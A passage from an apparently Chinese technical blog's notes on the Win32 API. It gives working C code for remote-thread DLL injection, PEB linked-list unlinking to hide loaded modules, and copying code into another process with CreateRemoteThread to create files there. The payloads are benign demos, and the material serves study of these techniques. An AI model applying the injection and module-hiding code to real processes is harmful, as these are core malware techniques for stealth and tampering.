class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">GetProcessIdByName</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* processName)</span> &#123;</span><br><span class="line">	HANDLE hSnap;</span><br><span class="line">	PROCESSENTRY32 pe32;</span><br><span class="line">	DWORD processId = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSnap == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed to create snapshot\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">	<span class="keyword">if</span> (!Process32First(hSnap, &amp;pe32)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed to get the first process\n&quot;</span>);</span><br><span class="line">		CloseHandle(hSnap);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strcmp</span>(pe32.szExeFile, processName) == <span class="number">0</span>) &#123;</span><br><span class="line">			processId = pe32.th32ProcessID;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!Process32Next(hSnap, &amp;pe32)) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseHandle(hSnap);</span><br><span class="line">	<span class="keyword">return</span> processId;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 通过进程名获取进程PID</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span>* processName = <span class="string">&quot;被注入程序.exe&quot;</span>;</span><br><span class="line">	DWORD processId = GetProcessIdByName(processName);</span><br><span class="line">	<span class="keyword">if</span> (processId == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed to find the process\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Process ID: %lu\n&quot;</span>, processId);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 注入DLL</span></span><br><span class="line">	LoadDll(processId, <span class="string">&quot;./远程线程注入dll.dll&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>被注入程序.exe：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disaboe:6031)</span></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">1000</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;-----%d-----\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hThread;</span><br><span class="line">	hThread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line"></span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注入的DLL：</p>
<p>pch.h头文件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PCH_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PCH_H</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加要在此处预编译的标头</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//PCH_H</span></span></span><br></pre></td></tr></table></figure>

<p>dllmain.cpp：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The program is being injected\n&quot;</span>);</span><br><span class="line">        Sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params">                     )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="模块隐藏"><a href="#模块隐藏" class="headerlink" title="模块隐藏"></a>模块隐藏</h2><h3 id="模块隐藏之断链"><a href="#模块隐藏之断链" class="headerlink" title="模块隐藏之断链"></a>模块隐藏之断链</h3><p>TEB(Thread Environment Block线程环境块) ，他记录线程相关的信息，每一个线程都有自己的TEB，<code>FS:[0]</code>是当前线程的TEB。</p>
<p>PEB(Process Environment Block进程环境块)存放进程信息，每个进程都有自己的PEB信息，TEB偏移0x30即当前进程的PEB地址</p>
<p>TEB和PEB都在用户空间</p>
<p><img src="/2024/07/05/Win32API/image-20240320200212614.png" alt="image-20240320200212614"></p>
<p>在OD中使用指令<code>dd [FS]</code>，跳转到TEB的位置：</p>
<p>比如，先打开kernel32.dll的位置，</p>
<p><img src="/2024/07/05/Win32API/image-20240320170850397.png" alt="image-20240320170850397"></p>
<p><img src="/2024/07/05/Win32API/image-20240320191115578.png" alt="image-20240320191115578"></p>
<p><img src="/2024/07/05/Win32API/image-20240320171515791.png" alt="image-20240320171515791"></p>
<p>当API函数遍历模块的时候就是查PEB中的表</p>
<p><img src="/2024/07/05/Win32API/image-20240320171915170.png" alt="image-20240320171915170"></p>
<h3 id="PEB断链原码"><a href="#PEB断链原码" class="headerlink" title="PEB断链原码"></a>PEB断链原码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    USHORT Length;        <span class="comment">//字符串长度</span></span><br><span class="line">    USHORT MaximumLength; <span class="comment">//字符串最大长度</span></span><br><span class="line">    PWSTR Buffer;         <span class="comment">//双字节字符串指针</span></span><br><span class="line">&#125; UNICODE_STRING, * PUNICODE_STRING;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG Length;</span><br><span class="line">    BOOLEAN Initialized;</span><br><span class="line">    PVOID SsHandle;</span><br><span class="line">    LIST_ENTRY InLoadOrderModuleList;           <span class="comment">//代表按加载顺序构成的模块列表</span></span><br><span class="line">    LIST_ENTRY InMemoryOrderModuleList;         <span class="comment">//代表按内存顺序构成的模块列表</span></span><br><span class="line">    LIST_ENTRY InInitializationOrderModuleList; <span class="comment">//代表按初始化顺序构成的模块链表</span></span><br><span class="line">&#125;PEB_LDR_DATA, * PPEB_LDR_DATA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderModuleList;  <span class="comment">//代表按加载顺序构成的模块列表</span></span><br><span class="line">    LIST_ENTRY InMemoryOrderModuleList;    <span class="comment">//代表按内存顺序构成的模块列表</span></span><br><span class="line">    LIST_ENTRY InInitializeationOrderModuleList; <span class="comment">//代表按初始化顺序构成的模块链表</span></span><br><span class="line">    PVOID DllBase;     <span class="comment">//该模块的基地址</span></span><br><span class="line">    PVOID EntryPoint;  <span class="comment">//该模块的入口</span></span><br><span class="line">    ULONG SizeOfImage; <span class="comment">//该模块的影像大小</span></span><br><span class="line">    UNICODE_STRING FullDllName;    <span class="comment">//模块的完整路径</span></span><br><span class="line">    UNICODE_STRING BaseDllName;    <span class="comment">//模块名</span></span><br><span class="line">    ULONG Flags;</span><br><span class="line">    SHORT LoadCount;</span><br><span class="line">    SHORT TlsIndex;</span><br><span class="line">    HANDLE SectionHandle;</span><br><span class="line">    ULONG CheckSum;</span><br><span class="line">    ULONG TimeDataStamp;</span><br><span class="line">&#125;LDR_MODULE, * PLDR_MODULE;</span><br><span class="line"></span><br><span class="line">PEB_LDR_DATA* g_pPebLdr = <span class="literal">NULL</span>;</span><br><span class="line">LDR_MODULE* g_pLdrModule = <span class="literal">NULL</span>;</span><br><span class="line">LIST_ENTRY* g_pInLoadOrderModule;</span><br><span class="line">LIST_ENTRY* g_pInMemoryOrderModule;</span><br><span class="line">LIST_ENTRY* g_pInInitializeationOrderModule;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ring3BrokenChains</span><span class="params">(HMODULE hModule)</span></span><br><span class="line">&#123;</span><br><span class="line">    LIST_ENTRY* pHead = g_pInLoadOrderModule;</span><br><span class="line">    LIST_ENTRY* pCur = pHead;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        pCur = pCur-&gt;Blink;</span><br><span class="line">        g_pLdrModule = (PLDR_MODULE)pCur;  <span class="comment">// 这里为什么可以直接将pCur转为PLDR_MODULE，见下面代码解释</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// CONTAINING_RECORD这个宏返回成员变量所在结构体的基址，ldte == g_pLdrModule</span></span><br><span class="line">        <span class="comment">// PLDR_MODULE ldte = CONTAINING_RECORD(pCur, _LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (hModule == g_pLdrModule-&gt;DllBase)</span><br><span class="line">        &#123;</span><br><span class="line">            g_pLdrModule-&gt;InLoadOrderModuleList.Blink-&gt;Flink = g_pLdrModule-&gt;InLoadOrderModuleList.Flink;</span><br><span class="line">            g_pLdrModule-&gt;InLoadOrderModuleList.Flink-&gt;Blink = g_pLdrModule-&gt;InLoadOrderModuleList.Blink;</span><br><span class="line"></span><br><span class="line">            g_pLdrModule-&gt;InInitializeationOrderModuleList.Blink-&gt;Flink = g_pLdrModule-&gt;InInitializeationOrderModuleList.Flink;</span><br><span class="line">            g_pLdrModule-&gt;InInitializeationOrderModuleList.Flink-&gt;Blink = g_pLdrModule-&gt;InInitializeationOrderModuleList.Blink;</span><br><span class="line"></span><br><span class="line">            g_pLdrModule-&gt;InMemoryOrderModuleList.Blink-&gt;Flink = g_pLdrModule-&gt;InMemoryOrderModuleList.Flink;</span><br><span class="line">            g_pLdrModule-&gt;InMemoryOrderModuleList.Flink-&gt;Blink = g_pLdrModule-&gt;InMemoryOrderModuleList.Blink;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (pHead != pCur);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov eax, fs: [<span class="number">0x30</span>] ;  <span class="comment">// PPEB</span></span><br><span class="line">        mov ecx, [eax + <span class="number">0xC</span>];  <span class="comment">// ldr</span></span><br><span class="line">        mov g_pPebLdr, ecx;</span><br><span class="line"></span><br><span class="line">        mov ebx, ecx;</span><br><span class="line">        add ebx, <span class="number">0xC</span>;</span><br><span class="line">        mov g_pInLoadOrderModule, ebx;              <span class="comment">// 第1个链表</span></span><br><span class="line"></span><br><span class="line">        mov ebx, ecx;</span><br><span class="line">        add ebx, <span class="number">0x14</span>;</span><br><span class="line">        mov g_pInMemoryOrderModule, ebx;            <span class="comment">// 第2个链表</span></span><br><span class="line"></span><br><span class="line">        mov ebx, ecx;</span><br><span class="line">        add ebx, <span class="number">0x1C</span>;</span><br><span class="line">        mov g_pInInitializeationOrderModule, ebx;   <span class="comment">// 第3个链表</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;点任意按键开始断链&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    ring3BrokenChains(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;断链成功\n&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>比如：使用以上函数，将以下几个库都断开</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ring3BrokenChains(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>));</span><br><span class="line">ring3BrokenChains(GetModuleHandleA(<span class="string">&quot;ntdll.dll&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>断开前：</p>
<p><img src="/2024/07/05/Win32API/image-20240320205056436.png" alt="image-20240320205056436"></p>
<p>断开后：</p>
<p><img src="/2024/07/05/Win32API/image-20240320205125990.png" alt="image-20240320205125990"></p>
<p>参见：[<a href="https://bbs.kanxue.com/thread-278717.htm">原创]超详细的3环和0环断链隐藏分析-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a></p>
<h2 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h2><h3 id="代码注入原则"><a href="#代码注入原则" class="headerlink" title="代码注入原则"></a>代码注入原则</h3><p>四种代码不能注入的情况：</p>
<p>&lt;1&gt; 不能有全局变量<br>&lt;2&gt; 不能使用常量字符串<br>&lt;3&gt; 不能使用系统调用<br>&lt;4&gt; 不能嵌套其他函数</p>
<h3 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h3><p>有这么多限制该怎么办？假设我们要将代码进程的代码拷贝过去，这段代码的作用就是创建文件，那么它得流程可以如下图所示：</p>
<img src="/2024/07/05/Win32API/image-20240321135504313.png" alt="image-20240321135504313" style="zoom:70%;">

<p>首先将代码进程的ThreadProc复制过去，然后将复制过去之后目标进程的地址给到<strong>CreateRemoteThread</strong>函数，这样就解决了自定义函数的问题；</p>
<p>其次我们要创建文件的话就必须要使用<strong>CreateFile</strong>函数，我们不能直接这样写，因为它依赖当前进程的导入表，当前进程和目标进程导入表的地址肯定是不一样的，<strong>所以不符合复制代码的编写原则</strong>；所以我们可以通过线程函数的参数来解决，我们先将所有用到的目标参数写到一个结构体中复制到目标进程，然后将目标进程结构体的地址作为线程函数的参数。</p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>传递参数进行远程注入代码的实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    DWORD dwCreateAPIAddr;                <span class="comment">// Createfile函数的地址</span></span><br><span class="line">    LPCTSTR lpFileName;                    <span class="comment">// 下面都是CreateFile所需要用到的参数</span></span><br><span class="line">    DWORD dwDesiredAccess;</span><br><span class="line">    DWORD dwShareMode;</span><br><span class="line">    LPSECURITY_ATTRIBUTES lpSecurityAttributes;</span><br><span class="line">    DWORD dwCreationDisposition;</span><br><span class="line">    DWORD dwFlagsAndAttributes;</span><br><span class="line">    HANDLE hTemplateFile;</span><br><span class="line">&#125; CREATEFILE_PARAM;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数指针</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">HANDLE</span><span class="params">(WINAPI* PFN_CreateFile)</span> <span class="params">(</span></span><br><span class="line"><span class="params">    LPCTSTR lpFileName,</span></span><br><span class="line"><span class="params">    DWORD dwDesiredAccess,</span></span><br><span class="line"><span class="params">    DWORD dwShareMode,</span></span><br><span class="line"><span class="params">    LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span><br><span class="line"><span class="params">    DWORD dwCreationDisposition,</span></span><br><span class="line"><span class="params">    DWORD dwFlagsAndAttributes,</span></span><br><span class="line"><span class="params">    HANDLE hTemplateFile</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编写要复制到目标进程的函数</span></span><br><span class="line">DWORD _stdcall <span class="title function_">CreateFileThreadProc</span><span class="params">(LPVOID lparam)</span></span><br><span class="line">&#123;</span><br><span class="line">    CREATEFILE_PARAM* Gcreate = (CREATEFILE_PARAM*)lparam;</span><br><span class="line">    PFN_CreateFile pfnCreateFile;</span><br><span class="line">    pfnCreateFile = (PFN_CreateFile)Gcreate-&gt;dwCreateAPIAddr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// creatFile结构体全部参数</span></span><br><span class="line">    pfnCreateFile(</span><br><span class="line">        Gcreate-&gt;lpFileName,</span><br><span class="line">        Gcreate-&gt;dwDesiredAccess,</span><br><span class="line">        Gcreate-&gt;dwShareMode,</span><br><span class="line">        Gcreate-&gt;lpSecurityAttributes,</span><br><span class="line">        Gcreate-&gt;dwCreationDisposition,</span><br><span class="line">        Gcreate-&gt;dwFlagsAndAttributes,</span><br><span class="line">        Gcreate-&gt;hTemplateFile</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 远程创建文件</span></span><br><span class="line">BOOL <span class="title function_">RemotCreateFile</span><span class="params">(DWORD dwProcessID, <span class="type">char</span>* szFilePathName)</span></span><br><span class="line">&#123;</span><br><span class="line">    BOOL bRet;</span><br><span class="line">    DWORD dwThread;</span><br><span class="line">    HANDLE hProcess;</span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    DWORD dwThreadFunSize;</span><br><span class="line">    CREATEFILE_PARAM GCreateFile;</span><br><span class="line">    LPVOID lpFilePathName;</span><br><span class="line">    LPVOID lpRemotThreadAddr;</span><br><span class="line">    LPVOID lpFileParamAddr;</span><br><span class="line">    DWORD dwFunAddr;</span><br><span class="line">    HMODULE hModule;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    bRet = <span class="number">0</span>;</span><br><span class="line">    hProcess = <span class="number">0</span>;</span><br><span class="line">    dwThreadFunSize = <span class="number">0x400</span>;</span><br><span class="line">    <span class="comment">// 1. 获取进程的句柄</span></span><br><span class="line">    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);</span><br><span class="line">    <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        OutputDebugString(<span class="string">&quot;OpenProcessError! \n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 分配3段内存：存储参数，线程函数，文件名</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2.1 用来存储文件名 +1是要计算到结尾处</span></span><br><span class="line">    lpFilePathName = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="built_in">strlen</span>(szFilePathName)+<span class="number">1</span>, MEM_COMMIT, PAGE_READWRITE); <span class="comment">// 在指定的进程中分配内存</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2.2 用来存储线程函数</span></span><br><span class="line">    lpRemotThreadAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwThreadFunSize, MEM_COMMIT, PAGE_READWRITE); <span class="comment">// 在指定的进程中分配内存</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2.3 用来存储文件参数</span></span><br><span class="line">    lpFileParamAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="keyword">sizeof</span>(CREATEFILE_PARAM), MEM_COMMIT, PAGE_READWRITE); <span class="comment">// 在指定的进程中分配内存</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 初始化CreateFile参数</span></span><br><span class="line">    GCreateFile.dwDesiredAccess = GENERIC_READ | GENERIC_WRITE;</span><br><span class="line">    GCreateFile.dwShareMode = <span class="number">0</span>;</span><br><span class="line">    GCreateFile.lpSecurityAttributes = <span class="literal">NULL</span>;</span><br><span class="line">    GCreateFile.dwCreationDisposition = OPEN_ALWAYS;</span><br><span class="line">    GCreateFile.dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL;</span><br><span class="line">    GCreateFile.hTemplateFile = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 获取CreateFile的地址</span></span><br><span class="line">    <span class="comment">// 因为每个进程中的LoadLibrary函数都在Kernel32.dll中，而且此dll的物理页是共享的，所以我们进程中获得的LoadLibrary地址和别的进程都是一样的</span></span><br><span class="line">    hModule = GetModuleHandle(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    GCreateFile.dwCreateAPIAddr = (DWORD)GetProcAddress(hModule, <span class="string">&quot;CreateFileA&quot;</span>);</span><br><span class="line">    FreeLibrary(hModule);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 初始化CreatFile文件名</span></span><br><span class="line">    GCreateFile.lpFileName = (LPCTSTR)lpFilePathName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 修改线程函数起始地址</span></span><br><span class="line">    dwFunAddr = (DWORD)CreateFileThreadProc;</span><br><span class="line">    <span class="comment">// 间接跳</span></span><br><span class="line">    <span class="keyword">if</span> (*((BYTE*)dwFunAddr) == <span class="number">0xE9</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        dwFunAddr = dwFunAddr + <span class="number">5</span> + *(DWORD*)(dwFunAddr + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 开始复制</span></span><br><span class="line">    <span class="comment">// 7.1 拷贝文件名</span></span><br><span class="line">    WriteProcessMemory(hProcess, lpFilePathName, szFilePathName, <span class="built_in">strlen</span>(szFilePathName) + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7.2 拷贝线程函数</span></span><br><span class="line">    WriteProcessMemory(hProcess, lpRemotThreadAddr, (LPVOID)dwFunAddr, dwThreadFunSize, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7.3 拷贝参数</span></span><br><span class="line">    WriteProcessMemory(hProcess, lpFileParamAddr, &amp;GCreateFile, <span class="keyword">sizeof</span>(CREATEFILE_PARAM), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 8. 创建远程线程</span></span><br><span class="line">    hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)lpRemotThreadAddr, lpFileParamAddr, <span class="number">0</span>, &amp;dwThread);<span class="comment">// lpAllocAddr传给线程函数的参数.因为dll名字分配在内存中</span></span><br><span class="line">    <span class="keyword">if</span> (hThread == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        OutputDebugString(<span class="string">&quot;CreateRemoteThread Error! \n&quot;</span>);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        CloseHandle(hModule);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 9. 关闭资源</span></span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hModule);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据进程名称获取进程ID</span></span><br><span class="line">DWORD <span class="title function_">GetPID</span><span class="params">(<span class="type">char</span> *szName)</span></span><br><span class="line">&#123;</span><br><span class="line">    HANDLE hProcessSnapShot = <span class="literal">NULL</span>;</span><br><span class="line">    PROCESSENTRY32 pe32 = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    hProcessSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hProcessSnapShot == (HANDLE)<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">    <span class="keyword">if</span> (Process32First(hProcessSnapShot, &amp;pe32))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(szName, pe32.szExeFile)) &#123;</span><br><span class="line">                <span class="keyword">return</span> (<span class="type">int</span>)pe32.th32ProcessID;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (Process32Next(hProcessSnapShot, &amp;pe32));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hProcessSnapShot);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    RemotCreateFile(GetPID(<span class="string">&quot;进程名&quot;</span>), <span class="string">&quot;文件名&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>清理C盘之数据迁移</title>
    <url>/2024/10/01/cleanC/</url>
    <content><![CDATA[<h2 id="清理C盘"><a href="#清理C盘" class="headerlink" title="清理C盘"></a>清理C盘</h2><p>每次取证C盘都要被火眼的hlnet填满……</p>
